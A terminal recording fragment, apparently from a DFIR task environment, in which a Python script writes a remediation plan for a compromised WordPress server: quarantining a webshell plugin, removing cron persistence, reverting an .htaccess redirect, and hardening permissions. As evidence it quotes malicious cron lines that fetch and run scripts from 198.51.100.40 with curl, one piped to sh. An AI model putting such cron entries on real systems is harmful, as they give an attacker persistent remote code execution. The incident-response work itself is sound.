[606.313915, "i", "seline)\r\rremediation = \"\"\"# Incident Remediation & Recovery Action Plan\r\r**Incident ID:** INC-2024-0816-WP  \r**Victim Host:** wordpress-prod-01 (`/sas/cti/advisory.txt:4`)  \r**Author:** Lead DFIR Analyst  \r\r---\r\r## 1. Operating Principles & Compliance Guidelines\r\rThis remediation plan guides system administrators through containment, eradication, hardening, and restoration of `wordpress-prod-01`.\r\r### Operating Rules\r- **Quarantine over Deletion:** Back up all malicious artifacts and modified configuration files to `/root/forensic_quarantine/` before modification.\r- **Console Execution:** System administrators must run commands on the server console.\r- **Verifiable Actions:** Every step includes concrete verification commands.\r\r---\r\r## 2. Phase 1: Immediate Containment & Evidence Quarantine\r\r### Step 1.1: Create Secure Forensic Quarantine Storage\r- **Command:**\r  ```bash\r  mkdir -p /root/forensic_quarantine/20240816_incident\r  chmod 700 /root/forensic_quarantine\r  ```\r- **Verification:** Run `ls -ld /root/forensic_quarantine` (Permissions must be `drwx------`).\r\r### Step 1.2: Quarantine Vulnerable Plugin / Webshell\r- **Evidence Citation:** `/disk/var/www/html/wp-content/plugins/contact/inc.php:1` (`/sas/alerts.json:4`)\r- **Command:**\r  ```bash\r  mv /var/www/html/wp-content/plugins/contact /root/forensic_quarantine/20240816_incident/\r  chmod -R 000 /root/forensic_quarantine/20240816_incident/contact\r  ```\r- **Verification:** Run `ls -la /var/www/html/wp-content/plugins/contact` (Must return `No such file or directory`).\r\r### Step 1.3: Remove Persistent `www-data` Crontab\r- **Evidence Citation:** `/disk/var/spool/cron/crontabs/www-data:2` (`* * * * * ...curl...198.51.100.40/payload.sh`)\r- **Command:**\r  ```bash\r  crontab -u www-data -l > /root/forensic_quarantine/20240816_incident/www-data.crontab.bak\r  crontab -u www-data -r\r  ```\r- **Verification:** Run `crontab -u www-data -l` (Must return `no crontab for www-data`).\r\r### Step 1.4: Remove Persistent `root` Crontab Beacon\r- **Evidence Citation:** `/disk/etc/crontab:5` (`# * * * * root <defanged beacon: curl hxxp://198.51.100.40/x | sh>`)\r- **Command:**\r  ```bash\r  cp /etc/crontab /root/forensic_quarantine/20240816_incident/crontab.bak\r  sed -i \"/198.51.100.40/d\" /etc/crontab\r  ```\r- **Verification:** Inspect `/etc/crontab` to ensure beacon entry is removed.\r\r### Step 1.5: Revert Malicious `.htaccess` Traffic Redirection\r- **Evidence Citation:** `/disk/var/www/html/.htaccess:2` (`.htaccess RewriteRule redirect of all traffic to 198.51.100.40`)\r- **Command:**\r  ```bash\r  cp /var/www/html/.htaccess /root/forensic_quarantine/20240816_incident/.htaccess.bak\r  sed -i \"/198.51.100.40/d\" /var/www/html/.htaccess\r  ```\r- **Verification:** Inspect `/var/www/html/.htaccess` and run test query:  \r  `curl -I http://localhost/` (Should return 200 OK, not redirect).\r\r### Step 1.6: Remove Defacement Landing Page\r- **Evidence Citation:** `/disk/var/www/html/index.html:1` (`/sas/alerts.json:11`)\r- **Command:**\r  ```bash\r  mv /var/www/html/index.html /root/forensic_quarantine/20240816_incident/index.html.defaced\r  ```\r- **Verification:** Access `http://localhost/` and confirm normal WordPress site loads.\r\r---\r\r## 3. Phase 2: Host & Application Hardening\r\r### Step 2.1: Harden `wp-config.php` Configuration & DB Credentials\r- **Evidence Citation:** `/disk/var/www/html/wp-config.php:4` (`/sas/alerts.json:18`, `/sas/baseline.json:2`)\r- **Command:**\r  ```bash\r  cp /var/www/html/wp-config.php /root/forensic_quarantine/20240816_incident/wp-config.php.bak\r  chmod 0600 /var/www/html/wp-config.php\r  ```\r- **Verification:** Verify `/var/www/html/wp-config.php` permissions are `0600`.\r\r### Step 2.2: Restrict System Crontab Permissions\r- **Evidence Citation:** `/disk/etc/crontab:1` (`0644` permissions)\r- **Command:**\r  ```bash\r  chmod 0600 /etc/crontab\r  chown root:root /etc/crontab\r  ```\r- **Verification:** Run `stat -c \"%a %U %G\" /etc/crontab` (Output must be `600 root root`).\r\r---\r\r## 4. Phase 3: Post-Remediation Monitoring\r\r1. **Log Inspection:** Monitor `/var/log/nginx/access.log` for access attemp"]
[606.313969, "i", "ts to plugin endpoints.\r2. **Crontab Audits:** Periodically audit `/var/spool/cron/crontabs/` and `/etc/crontab` for unauthorized tasks.\r3. **Core Verification:** Run `wp core verify-checksums` to confirm WordPress file integrity.\r\"\"\"\rwith open(\"/app/remediation-plan.md\", \"w\") as f:\r    f.write(remediation)\r\rprint(\"Files written successfully.\")\r'\r"]
